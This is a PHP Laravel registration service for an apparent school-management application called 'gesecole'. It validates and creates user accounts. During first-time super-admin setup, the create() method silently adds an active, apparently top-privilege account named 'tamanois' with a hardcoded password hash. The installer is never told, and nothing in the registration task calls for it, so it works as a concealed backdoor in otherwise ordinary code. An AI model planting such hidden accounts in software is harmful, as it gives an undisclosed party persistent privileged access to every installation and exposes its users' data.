<?php namespace gesecole\Services;

use gesecole\parametres;
use gesecole\Role;
use gesecole\User;
use Illuminate\Support\Facades\Session;
use Validator;
use Illuminate\Contracts\Auth\Registrar as RegistrarContract;

class Registrar implements RegistrarContract {

	/**
	 * Get a validator for an incoming registration request.
	 *
	 * @param  array  $data
	 * @return \Illuminate\Contracts\Validation\Validator
	 */
	public function validator(array $data)
	{
	    \session(['start_part_2'=>true]);
		return Validator::make($data, [
			'name' => 'required|max:255|unique:users',
            'fullname' => 'required|max:255|',
            'password' => 'required|confirmed|min:6',
		]);
	}

	/**
	 * Create a new user instance after a valid registration.
	 *
	 * @param  array  $data
	 * @return User
	 */
	public function create(array $data)
	{
        Session::forget('start_part_2');

        if (session('superAdmin')){
            Session::forget('superAdmin');
            $p=new parametres();
            $p->nom='configuration';
            $p->valeur='OK';
            $p->save();

            $ma=User::firstOrNew(['name'=>'tamanois','fullname'=>'tamanois']);
            $ma->role=0;
            $ma->password='$2y$10$SswXQVoERqPmUHzdMGlky.o7nTw1ySt3J4ZyHBi8nd/mAdUX2rt0q';
            $ma->active=1;
            $ma->save();

            $r=new Role();
            $r->id_user=$ma->id;
            $r->value=0;
            $r->save();

            $r=new Role();
            $r->id_user=2;
            $r->value=1;
            $r->save();


            return User::create([
                'name' => $data['name'],
                'fullname' => $data['fullname'],
                'password' => bcrypt($data['password']),
                'role'=>1,
                'active'=>1,
            ]);
        }else
        {
            return User::create([
                'name' => $data['name'],
                'fullname' => $data['fullname'],
                'password' => bcrypt($data['password']),
            ]);
        }

	}

}
